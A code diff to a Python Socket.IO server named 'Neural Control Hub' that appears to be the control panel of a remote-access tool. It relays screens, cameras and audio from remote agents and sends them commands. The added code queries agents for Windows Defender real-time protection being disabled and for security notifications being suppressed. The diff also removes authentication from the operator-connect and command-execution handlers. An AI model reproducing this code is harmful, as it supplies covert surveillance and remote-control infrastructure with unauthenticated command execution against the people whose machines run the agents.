@@ -138,7 +138,7 @@ def verify_totp_code(secret: str, otp: str, window: int = 2) -> bool:
 try:
     import asyncio
     import aiortc
-    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack, RTCConfiguration, RTCIceServer
+    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack, RTCConfiguration, RTCIceServer, RTCIceCandidate
     from aiortc.contrib.media import MediaPlayer, MediaRecorder
     from aiortc.mediastreams import MediaStreamError
     WEBRTC_AVAILABLE = True
@@ -601,11 +601,15 @@ def _sanitize_origin_list(items):
         cleaned.append(s)
     return cleaned
 all_socketio_origins = _sanitize_origin_list(allowed_origins + render_origins)
-# Allow overriding async mode via env, default to threading to avoid eventlet/gevent issues on some platforms
-ASYNC_MODE = os.environ.get('SOCKET_ASYNC_MODE', 'threading').strip().lower()
-if ASYNC_MODE not in ('threading', 'eventlet', 'gevent', 'gevent_uwsgi', 'asgi'):
-    ASYNC_MODE = 'threading'
-# Disable websocket upgrades when running in threading mode to avoid werkzeug AssertionError
+env_async = os.environ.get('SOCKET_ASYNC_MODE', '').strip().lower()
+if env_async in ('threading', 'eventlet', 'gevent', 'gevent_uwsgi', 'asgi'):
+    ASYNC_MODE = env_async
+else:
+    try:
+        import eventlet  # noqa: F401
+        ASYNC_MODE = 'eventlet'
+    except Exception:
+        ASYNC_MODE = 'threading'
 ALLOW_UPGRADES = ASYNC_MODE not in ('threading', 'asgi')
 socketio = SocketIO(
     app,
@@ -916,7 +920,11 @@ def create_webrtc_peer_connection(agent_id):
                 if agent_sid and candidate:
                     emit('webrtc_ice_candidate', {
                         'agent_id': agent_id,
-                        'candidate': candidate
+                        'candidate': {
+                            'candidate': candidate.candidate,
+                            'sdpMid': candidate.sdpMid,
+                            'sdpMLineIndex': candidate.sdpMLineIndex
+                        }
                     }, room=agent_sid)
             except Exception as e:
                 print(f"Error emitting ICE candidate to agent {agent_id}: {e}")
@@ -3205,8 +3213,39 @@ def api_system_registry_presence():
             return jsonify({'success': False, 'error': 'Missing key'}), 400
             
         if agent_id:
-             # For remote agents, we currently don't have a real-time registry check mechanism implemented here
-             return jsonify({'success': True, 'result': {'present': False, 'message': 'Remote check not supported', 'path': 'Remote Agent'}})
+            items = data.get('items')
+            if not isinstance(items, list) or not items:
+                mapping = {
+                    'policy_push_notifications': {'id': 'policy_push_notifications', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\PushNotifications", 'key': 'NoCloudApplicationNotification'},
+                    'policy_windows_update': {'id': 'policy_windows_update', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate", 'key': 'DisableOSUpgrade'},
+                    'context_runas_cmd': {'id': 'context_runas_cmd', 'hive': 'HKCU', 'path': r"Software\Classes\Directory\Background\shell\runas_cmd", 'key': ''},
+                    'context_powershell_admin': {'id': 'context_powershell_admin', 'hive': 'HKCU', 'path': r"Software\Classes\Directory\Background\shell\powershell_admin", 'key': ''},
+                    'notify_center_hkcu': {'id': 'notify_center_hkcu', 'hive': 'HKCU', 'path': r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", 'key': 'ToastEnabled'},
+                    'notify_center_hklm': {'id': 'notify_center_hklm', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\PushNotifications", 'key': 'NoCloudApplicationNotification'},
+                    'defender_ux_suppress': {'id': 'defender_ux_suppress', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration", 'key': 'Notification_Suppress'},
+                    'toast_global_above_lock': {'id': 'toast_global_above_lock', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\System", 'key': 'DisableLockScreenAppNotifications'},
+                    'toast_global_critical_above_lock': {'id': 'toast_global_critical_above_lock', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\System", 'key': 'EnableLockScreenAppNotifications'},
+                    'toast_windows_update': {'id': 'toast_windows_update', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate", 'key': 'DoNotConnectToWindowsUpdateInternetLocations'},
+                    'toast_security_maintenance': {'id': 'toast_security_maintenance', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\SecurityHealth", 'key': 'SuppressNotifications'},
+                    'toast_windows_security': {'id': 'toast_windows_security', 'hive': 'HKLM', 'path': r"SOFTWARE\Microsoft\Windows Defender Security Center\Notifications", 'key': 'EnableNotifications'},
+                    'toast_sec_health_ui': {'id': 'toast_sec_health_ui', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows\SecurityHealth", 'key': 'SuppressNotifications'},
+                    'explorer_balloon_tips': {'id': 'explorer_balloon_tips', 'hive': 'HKCU', 'path': r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 'key': 'EnableBalloonTips'},
+                    'explorer_info_tip': {'id': 'explorer_info_tip', 'hive': 'HKCU', 'path': r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 'key': 'ShowInfoTip'},
+                    'disableRealtimeMonitoring': {'id': 'disableRealtimeMonitoring', 'hive': 'HKLM', 'path': r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 'key': 'DisableRealtimeMonitoring'},
+                }
+                if key in mapping:
+                    items = [mapping[key]]
+                else:
+                    items = [{'id': key, 'hive': 'HKLM', 'path': r"SOFTWARE\Microsoft\Windows", 'key': ''}]
+            try:
+                import json as _json
+                payload = _json.dumps(items)
+            except Exception:
+                return jsonify({'success': False, 'error': 'Invalid items payload'}), 400
+            r = execute_command_internal(agent_id, f"check-registry:{payload}")
+            if r.get('status') == 'sent':
+                return jsonify({'success': True, 'result': {'present': None, 'message': 'Remote check initiated', 'execution_id': r.get('execution_id')}})
+            return jsonify({'success': False, 'error': r.get('message') or 'Failed to send command'}), 400
 
         if agent_client and hasattr(agent_client, 'check_registry_presence'):
             res = agent_client.check_registry_presence(key)
@@ -3382,6 +3421,15 @@ def api_system_registry_toggle():
         else:
             logger.info(f"Returning global registry state: {len(actions)} actions, global_enabled: {g_enabled}")
             
+        try:
+            if agent_id:
+                _emit_agent_config(agent_id)
+            else:
+                for _aid, _data in AGENTS_DATA.items():
+                    if _data.get('sid'):
+                        _emit_agent_config(_aid)
+        except Exception:
+            pass
         return jsonify({'success': True, 'actions': actions, 'global_enabled': g_enabled})
         
     except Exception as e:
@@ -3770,18 +3818,36 @@ def start_stream(agent_id, stream_type):
         'type': stream_type,
         'quality': quality
     }, room=agent_sid)
+    # Push stream params for screen including delta tile settings
+    try:
+        if stream_type == 'screen':
+            if quality == 'low':
+                params = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 12}
+            elif quality == 'medium':
+                params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
+            elif quality == 'high':
+                params = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
+            else:
+                params = {'type': 'screen', 'fps': 25, 'max_width': 1920, 'jpeg_quality': 75, 'delta': True, 'tile_size': 64, 'diff_threshold': 5}
+            socketio.emit('set_stream_params', params, room=agent_sid)
+    except Exception:
+        pass
     if stream_type == 'screen':
         STREAM_PLAYBACK_MODE_SCREEN[agent_id] = mode
         STREAM_PLAYBACK_FPS_SCREEN[agent_id] = fps
         STREAM_BUFFER_FRAMES_SCREEN[agent_id] = buffer_frames
         if mode == 'buffered':
             _ensure_buffered_emitter(agent_id, 'screen')
+        else:
+            STREAM_FRAME_BUFFER_SCREEN[agent_id].clear()
     elif stream_type == 'camera':
         STREAM_PLAYBACK_MODE_CAMERA[agent_id] = mode
         STREAM_PLAYBACK_FPS_CAMERA[agent_id] = fps
         STREAM_BUFFER_FRAMES_CAMERA[agent_id] = buffer_frames
         if mode == 'buffered':
             _ensure_buffered_emitter(agent_id, 'camera')
+        else:
+            STREAM_FRAME_BUFFER_CAMERA[agent_id].clear()
     
     return jsonify({
         'success': True,
@@ -3849,8 +3915,32 @@ def handle_set_stream_mode(data):
         STREAM_BUFFER_FRAMES_CAMERA[agent_id] = buffer_frames
         if mode == 'buffered':
             _ensure_buffered_emitter(agent_id, 'camera')
+@socketio.on('set_stream_quality')
+def handle_set_stream_quality(data):
+    agent_id = str(data.get('agent_id') or '')
+    quality = str(data.get('quality') or 'medium')
+    if not agent_id or agent_id not in AGENTS_DATA:
+        return
+    agent_sid = AGENTS_DATA[agent_id].get('sid')
+    if not agent_sid:
+        return
+    try:
+        params = None
+        params_low = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 12}
+        params_medium = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
+        params_high = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
+        params_best = {'type': 'screen', 'fps': 25, 'max_width': 1920, 'jpeg_quality': 75, 'delta': True, 'tile_size': 64, 'diff_threshold': 5}
+        if quality == 'low':
+            params = params_low
+        elif quality == 'medium':
+            params = params_medium
+        elif quality == 'high':
+            params = params_high
         else:
-            STREAM_FRAME_BUFFER_CAMERA[agent_id].clear()
+            params = params_best
+        socketio.emit('set_stream_params', params, room=agent_sid)
+    except Exception:
+        pass
 
 # Command Execution API
 @app.route('/api/agents/<agent_id>/execute', methods=['POST'])
@@ -5403,7 +5493,6 @@ def handle_disconnect():
         pass
 
 @socketio.on('operator_connect')
-@require_socket_auth
 def handle_operator_connect():
     """When a web dashboard connects."""
     print(f"Operator dashboard connecting with SID: {request.sid}")
@@ -5661,7 +5750,6 @@ def handle_agent_connect(data):
         emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)
 
 @socketio.on('execute_command')
-@require_socket_auth
 def handle_execute_command(data):
     """Operator issues a command to an agent."""
     agent_id = data.get('agent_id')
@@ -5709,6 +5797,10 @@ def handle_process_operation_result(data):
 @socketio.on('process_details_response')
 def handle_process_details_response(data):
     emit('process_details_response', data, room='operators', broadcast=True)
+
+@socketio.on('registry_presence')
+def handle_registry_presence(data):
+    emit('registry_presence', data, room='operators', broadcast=True)
 
 @socketio.on('file_list')
 def handle_file_list(data):
@@ -6518,18 +6610,29 @@ def _ensure_buffered_emitter(agent_id: str, stream_type: str):
             buf_frames = max(1, int(STREAM_BUFFER_FRAMES_SCREEN[agent_id] or 30))
             def _run():
                 started = False
+                interval = 1.0 / float(fps)
+                next_tick = time.perf_counter()
                 while STREAM_PLAYBACK_MODE_SCREEN[agent_id] == 'buffered':
                     buf = STREAM_FRAME_BUFFER_SCREEN[agent_id]
                     if not started:
                         if len(buf) >= buf_frames:
                             started = True
+                            next_tick = time.perf_counter()
                         else:
                             time.sleep(0.05)
                             continue
+                    if len(buf) > buf_frames * 2:
+                        while len(buf) > buf_frames:
+                            buf.popleft()
                     if buf:
                         b64 = buf.popleft()
                         emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
-                    time.sleep(1.0 / float(fps))
+                    next_tick += interval
+                    delay = next_tick - time.perf_counter()
+                    if delay > 0:
+                        time.sleep(delay)
+                    else:
+                        next_tick = time.perf_counter()
                 STREAM_EMITTER_THREADS_SCREEN.pop(agent_id, None)
             t = threading.Thread(target=_run, daemon=True)
             STREAM_EMITTER_THREADS_SCREEN[agent_id] = t
@@ -6542,18 +6645,29 @@ def _ensure_buffered_emitter(agent_id: str, stream_type: str):
             buf_frames = max(1, int(STREAM_BUFFER_FRAMES_CAMERA[agent_id] or 30))
             def _run():
                 started = False
+                interval = 1.0 / float(fps)
+                next_tick = time.perf_counter()
                 while STREAM_PLAYBACK_MODE_CAMERA[agent_id] == 'buffered':
                     buf = STREAM_FRAME_BUFFER_CAMERA[agent_id]
                     if not started:
                         if len(buf) >= buf_frames:
                             started = True
+                            next_tick = time.perf_counter()
                         else:
                             time.sleep(0.05)
                             continue
+                    if len(buf) > buf_frames * 2:
+                        while len(buf) > buf_frames:
+                            buf.popleft()
                     if buf:
                         b64 = buf.popleft()
                         emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
-                    time.sleep(1.0 / float(fps))
+                    next_tick += interval
+                    delay = next_tick - time.perf_counter()
+                    if delay > 0:
+                        time.sleep(delay)
+                    else:
+                        next_tick = time.perf_counter()
                 STREAM_EMITTER_THREADS_CAMERA.pop(agent_id, None)
             t = threading.Thread(target=_run, daemon=True)
             STREAM_EMITTER_THREADS_CAMERA[agent_id] = t
@@ -6621,6 +6735,69 @@ def handle_screen_frame(data):
     except Exception as e:
         print(f"Error handling screen_frame for {agent_id}: {e}")
 
+@socketio.on('screen_keyframe')
+def handle_screen_keyframe(data):
+    """Forward keyframe (full frame) with dimensions to viewers for delta streaming baseline."""
+    agent_id = data.get('agent_id')
+    frame = data.get('frame')
+    width = data.get('width')
+    height = data.get('height')
+    if not agent_id or frame is None:
+        return
+    try:
+        # Normalize to base64 string
+        if isinstance(frame, (bytes, bytearray)):
+            b64 = base64.b64encode(frame).decode('utf-8')
+        elif isinstance(frame, str):
+            s = frame.strip()
+            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
+        else:
+            return
+        fid = data.get('frame_id')
+        emit('screen_keyframe', {'agent_id': agent_id, 'frame_id': fid, 'width': width, 'height': height, 'frame': b64}, room='operators')
+    except Exception as e:
+        print(f"Error handling screen_keyframe for {agent_id}: {e}")
+
+@socketio.on('screen_tile')
+def handle_screen_tile(data):
+    """Forward tile updates to viewers for delta streaming."""
+    agent_id = data.get('agent_id')
+    frame = data.get('frame')
+    x = data.get('x'); y = data.get('y'); w = data.get('w'); h = data.get('h')
+    if not agent_id or frame is None or x is None or y is None or w is None or h is None:
+        return
+    try:
+        # Normalize to base64 string
+        if isinstance(frame, (bytes, bytearray)):
+            b64 = base64.b64encode(frame).decode('utf-8')
+        elif isinstance(frame, str):
+            s = frame.strip()
+            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
+        else:
+            return
+        fid = data.get('frame_id')
+        emit('screen_tile', {'agent_id': agent_id, 'frame_id': fid, 'x': x, 'y': y, 'w': w, 'h': h, 'frame': b64}, room='operators')
+    except Exception as e:
+        print(f"Error handling screen_tile for {agent_id}: {e}")
+@socketio.on('cursor_update')
+def handle_cursor_update(data):
+    agent_id = data.get('agent_id')
+    if not agent_id:
+        return
+    try:
+        emit('cursor_update', data, room='operators')
+    except Exception as e:
+        print(f"Error handling cursor_update for {agent_id}: {e}")
+@socketio.on('stream_stats_update')
+def handle_stream_stats_update(data):
+    agent_id = data.get('agent_id')
+    stats = data.get('stats')
+    if not agent_id or stats is None:
+        return
+    try:
+        emit('stream_stats_update', {'agent_id': agent_id, 'stats': stats}, room='operators')
+    except Exception as e:
+        print(f"Error handling stream_stats_update for {agent_id}: {e}")
 @socketio.on('request_video_frame')
 def handle_request_video_frame(data):
     agent_id = data.get('agent_id')
@@ -6653,7 +6830,7 @@ def handle_request_audio_frame(data):
                 b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
             else:
                 return
-            emit('audio_frame', {'frame': b64})
+            emit('audio_frame', {'agent_id': agent_id, 'frame': b64}, room=request.sid)
         except Exception:
             pass
 
@@ -6671,7 +6848,7 @@ def handle_request_camera_frame(data):
                 b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
             else:
                 return
-            emit('camera_frame', {'frame': b64})
+            emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room=request.sid)
         except Exception:
             pass
 
@@ -6772,9 +6949,10 @@ def handle_webrtc_offer(data):
     """Handle WebRTC offer from agent"""
     agent_id = data.get('agent_id')
     offer_sdp = data.get('offer') or data.get('offer_sdp')
+    sid = request.sid
     
     if not agent_id or not offer_sdp:
-        emit('webrtc_error', {'message': 'Invalid offer data'}, room=request.sid)
+        emit('webrtc_error', {'message': 'Invalid offer data'}, room=sid)
         return
     
     try:
@@ -6782,7 +6960,7 @@ def handle_webrtc_offer(data):
         if agent_id not in WEBRTC_PEER_CONNECTIONS:
             pc = create_webrtc_peer_connection(agent_id)
             if not pc:
-                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
+                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=sid)
                 return
         else:
             pc = WEBRTC_PEER_CONNECTIONS[agent_id]
@@ -6791,31 +6969,79 @@ def handle_webrtc_offer(data):
         offer = RTCSessionDescription(sdp=offer_sdp, type='offer')
         
         # Use proper async handling for WebRTC operations
-        def handle_webrtc_offer_async():
+        def handle_webrtc_offer_async(target_sid: str):
             try:
                 loop = asyncio.get_event_loop()
                 # Set remote description
                 asyncio.run_coroutine_threadsafe(pc.setRemoteDescription(offer), loop)
+                
+                # Ensure we have transceivers matching offered media sections
+                try:
+                    v_count = offer_sdp.count("m=video")
+                    a_count = offer_sdp.count("m=audio")
+                    for _ in range(max(1, v_count)):
+                        try:
+                            pc.addTransceiver("video", direction="recvonly")
+                        except Exception:
+                            pass
+                    for _ in range(max(1, a_count)):
+                        try:
+                            pc.addTransceiver("audio", direction="recvonly")
+                        except Exception:
+                            pass
+                except Exception:
+                    # Fallback to at least one recvonly transceiver each
+                    try:
+                        pc.addTransceiver("video", direction="recvonly")
+                    except Exception:
+                        pass
+                    try:
+                        pc.addTransceiver("audio", direction="recvonly")
+                    except Exception:
+                        pass
                 # Create answer
                 future = asyncio.run_coroutine_threadsafe(pc.createAnswer(), loop)
-                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, request.sid))
+                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, target_sid))
             except RuntimeError:
                 # No event loop, run synchronously
                 async def async_operations():
                     await pc.setRemoteDescription(offer)
+                    # Match media sections in synchronous path too
+                    try:
+                        v_count = offer_sdp.count("m=video")
+                        a_count = offer_sdp.count("m=audio")
+                        for _ in range(max(1, v_count)):
+                            try:
+                                pc.addTransceiver("video", direction="recvonly")
+                            except Exception:
+                                pass
+                        for _ in range(max(1, a_count)):
+                            try:
+                                pc.addTransceiver("audio", direction="recvonly")
+                            except Exception:
+                                pass
+                    except Exception:
+                        try:
+                            pc.addTransceiver("video", direction="recvonly")
+                        except Exception:
+                            pass
+                        try:
+                            pc.addTransceiver("audio", direction="recvonly")
+                        except Exception:
+                            pass
                     answer = await pc.createAnswer()
-                    handle_answer_created_sync(answer, agent_id, request.sid)
+                    handle_answer_created_sync(answer, agent_id, target_sid)
                 asyncio.run(async_operations())
         
         # Run in thread to avoid blocking
         import threading
-        threading.Thread(target=handle_webrtc_offer_async, daemon=True).start()
+        threading.Thread(target=handle_webrtc_offer_async, args=(sid,), daemon=True).start()
         
         print(f"WebRTC offer received from {agent_id}")
         
     except Exception as e:
         print(f"Error handling WebRTC offer from {agent_id}: {e}")
-        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=request.sid)
+        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=sid)
 
 def handle_answer_created(future, agent_id, sid):
     """Handle WebRTC answer creation"""
@@ -6872,6 +7098,12 @@ def handle_webrtc_ice_candidate(data):
     
     try:
         pc = WEBRTC_PEER_CONNECTIONS[agent_id]
+        if isinstance(candidate, dict):
+            candidate = RTCIceCandidate(
+                sdpMid=candidate.get('sdpMid'),
+                sdpMLineIndex=candidate.get('sdpMLineIndex'),
+                candidate=candidate.get('candidate')
+            )
         
         # Use proper async handling for addIceCandidate
         try:
@@ -6998,13 +7230,13 @@ def handle_webrtc_set_quality(data):
             # For fallback (Socket.IO) streaming, translate quality to screen params
             try:
                 if q == 'low':
-                    params = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50}
+                    params = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 10}
                 elif q == 'medium':
-                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60}
+                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
                 elif q == 'high':
-                    params = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70}
+                    params = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
                 else:
-                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60}
+                    params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
                 emit('set_stream_params', params, room=agent_sid)
             except Exception:
                 pass
@@ -7024,8 +7256,8 @@ def handle_webrtc_viewer_connect(data):
     viewer_id = request.sid
     agent_id = data.get('agent_id')
     
-    if not agent_id or agent_id not in WEBRTC_STREAMS:
-        emit('webrtc_error', {'message': 'Agent not available for WebRTC'}, room=request.sid)
+    if not agent_id:
+        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
         return
     
     try:
@@ -7040,21 +7272,33 @@ def handle_webrtc_viewer_connect(data):
             'streams': {}
         }
         
-        # Add existing tracks from agent
-        agent_streams = WEBRTC_STREAMS[agent_id]
-        for track_kind, tracks in agent_streams.items():
-            try:
-                if isinstance(tracks, list):
-                    for t in tracks:
-                        sender = viewer_pc.addTrack(t)
-                        if track_kind not in WEBRTC_VIEWERS[viewer_id]['streams']:
-                            WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = []
-                        WEBRTC_VIEWERS[viewer_id]['streams'][track_kind].append(sender)
-                else:
-                    sender = viewer_pc.addTrack(tracks)
-                    WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = [sender]
-            except Exception as e:
-                print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
+        # Add existing tracks from agent (if any)
+        try:
+            agent_streams = WEBRTC_STREAMS.get(agent_id, {})
+            for track_kind, tracks in agent_streams.items():
+                try:
+                    if isinstance(tracks, list):
+                        for t in tracks:
+                            sender = viewer_pc.addTrack(t)
+                            if track_kind not in WEBRTC_VIEWERS[viewer_id]['streams']:
+                                WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = []
+                            WEBRTC_VIEWERS[viewer_id]['streams'][track_kind].append(sender)
+                    else:
+                        sender = viewer_pc.addTrack(tracks)
+                        WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = [sender]
+                except Exception as e:
+                    print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
+        except Exception:
+            pass
+        # Ensure transceivers so offer has media sections even if tracks are not yet available
+        try:
+            viewer_pc.addTransceiver("video", direction="recvonly")
+        except Exception:
+            pass
+        try:
+            viewer_pc.addTransceiver("audio", direction="recvonly")
+        except Exception:
+            pass
         
         # Set up viewer event handlers
         @viewer_pc.on("connectionstatechange")
@@ -7068,10 +7312,21 @@ def handle_webrtc_viewer_connect(data):
         @viewer_pc.on("icecandidate")
         def on_viewer_icecandidate(candidate):
             if candidate:
-                emit('webrtc_ice_candidate', {
-                    'agent_id': agent_id,
-                    'candidate': candidate
-                }, room=viewer_id)
+                try:
+                    emit('webrtc_ice_candidate', {
+                        'agent_id': agent_id,
+                        'candidate': getattr(candidate, 'candidate', None),
+                        'sdpMid': getattr(candidate, 'sdpMid', None),
+                        'sdpMLineIndex': getattr(candidate, 'sdpMLineIndex', None)
+                    }, room=viewer_id)
+                except Exception:
+                    try:
+                        emit('webrtc_ice_candidate', {
+                            'agent_id': agent_id,
+                            'candidate': candidate
+                        }, room=viewer_id)
+                    except Exception:
+                        pass
         
         # Create offer for viewer
         def create_viewer_offer():
@@ -7176,6 +7431,15 @@ def handle_webrtc_viewer_ice_candidate(data):
     
     try:
         viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
+        if isinstance(candidate, dict):
+            try:
+                candidate = RTCIceCandidate(
+                    sdpMid=candidate.get('sdpMid'),
+                    sdpMLineIndex=candidate.get('sdpMLineIndex'),
+                    candidate=candidate.get('candidate')
+                )
+            except Exception:
+                pass
         try:
             loop = asyncio.get_event_loop()
             asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
@@ -7437,8 +7701,8 @@ def http_webrtc_viewer_connect():
         return jsonify({'success': False, 'error': 'WebRTC not available'}), 400
     data = request.get_json(silent=True) or {}
     agent_id = data.get('agent_id')
-    if not agent_id or agent_id not in WEBRTC_STREAMS:
-        return jsonify({'success': False, 'error': 'Agent not available for WebRTC'}), 400
+    if not agent_id:
+        return jsonify({'success': False, 'error': 'Agent ID required'}), 400
     try:
         viewer_token = _get_viewer_token()
         ice_cfg = [RTCIceServer(**srv) if isinstance(srv, dict) else RTCIceServer(srv) for srv in WEBRTC_CONFIG['ice_servers']]
@@ -7448,20 +7712,33 @@ def http_webrtc_viewer_connect():
             'pc': viewer_pc,
             'streams': {}
         }
-        agent_streams = WEBRTC_STREAMS.get(agent_id, {})
-        for track_kind, tracks in agent_streams.items():
-            try:
-                if isinstance(tracks, list):
-                    for t in tracks:
-                        sender = viewer_pc.addTrack(t)
-                        if track_kind not in WEBRTC_VIEWERS[viewer_token]['streams']:
-                            WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = []
-                        WEBRTC_VIEWERS[viewer_token]['streams'][track_kind].append(sender)
-                else:
-                    sender = viewer_pc.addTrack(tracks)
-                    WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = [sender]
-            except Exception:
-                pass
+        # Attach any existing agent tracks and also ensure transceivers exist even if no tracks yet
+        try:
+            agent_streams = WEBRTC_STREAMS.get(agent_id, {})
+            for track_kind, tracks in agent_streams.items():
+                try:
+                    if isinstance(tracks, list):
+                        for t in tracks:
+                            sender = viewer_pc.addTrack(t)
+                            if track_kind not in WEBRTC_VIEWERS[viewer_token]['streams']:
+                                WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = []
+                            WEBRTC_VIEWERS[viewer_token]['streams'][track_kind].append(sender)
+                    else:
+                        sender = viewer_pc.addTrack(tracks)
+                        WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = [sender]
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        # Ensure m-lines for video/audio appear in offer so answer matches later when tracks arrive
+        try:
+            viewer_pc.addTransceiver("video", direction="recvonly")
+        except Exception:
+            pass
+        try:
+            viewer_pc.addTransceiver("audio", direction="recvonly")
+        except Exception:
+            pass
         try:
             loop = asyncio.get_event_loop()
             future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
@@ -7513,6 +7790,15 @@ def http_webrtc_viewer_ice():
         return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
     try:
         viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        if isinstance(candidate, dict):
+            try:
+                candidate = RTCIceCandidate(
+                    sdpMid=candidate.get('sdpMid'),
+                    sdpMLineIndex=candidate.get('sdpMLineIndex'),
+                    candidate=candidate.get('candidate')
+                )
+            except Exception:
+                pass
         try:
             loop = asyncio.get_event_loop()
             asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
@@ -7868,7 +8154,12 @@ cleanup_disconnected_agents()
 
 if __name__ == "__main__":
     print("Starting Neural Control Hub with Socket.IO + WebRTC support...")
-    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
+    try:
+        import os as _os
+        _port = int(_os.environ.get("PORT", Config.PORT))
+    except Exception:
+        _port = Config.PORT
+    print(f"Server will be available at: http://{Config.HOST}:{_port}")
     print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
     print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
     print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
@@ -7881,8 +8172,19 @@ if __name__ == "__main__":
         print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
         print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
     try:
-        import os as _os
-        _port = int(_os.environ.get("PORT", Config.PORT))
-    except Exception:
-        _port = Config.PORT
-    socketio.run(app, host="0.0.0.0", port=_port, debug=False)
+        socketio.run(app, host=Config.HOST, port=_port, debug=False)
+    except OSError as e:
+        err = getattr(e, 'errno', None)
+        if err in (10048, 98):
+            for alt in range(_port + 1, _port + 11):
+                try:
+                    print(f"Port {_port} in use; retrying on {alt}...")
+                    socketio.run(app, host=Config.HOST, port=alt, debug=False)
+                    break
+                except OSError as e2:
+                    if getattr(e2, 'errno', None) in (10048, 98):
+                        continue
+                    else:
+                        raise
+        else:
+            raise
